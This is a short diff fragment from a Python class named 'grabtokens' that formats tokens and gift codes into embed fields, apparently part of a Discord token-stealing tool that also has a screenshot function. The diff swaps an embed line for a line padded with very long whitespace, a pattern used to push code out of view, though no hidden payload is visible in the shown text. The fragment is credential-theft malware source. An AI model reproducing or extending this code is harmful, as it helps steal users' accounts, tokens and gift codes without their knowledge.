@@ -302,8 +302,7 @@ class grabtokens():
             else:
                 for c, t in val_codes:                
                     val += f'\n:gift: `{t}:`\n**{c}**\n'
-
-            embed.add_field(name="\u200b", inline=False)                                                                                                                                                                                                                                                                                                                                                                                                                                                          
+                                                                                                                                                                                                                                                                                                                                                                                                                                                       
             embed.add_field(name=val_name, value=val, inline=False)
 
 def ss():
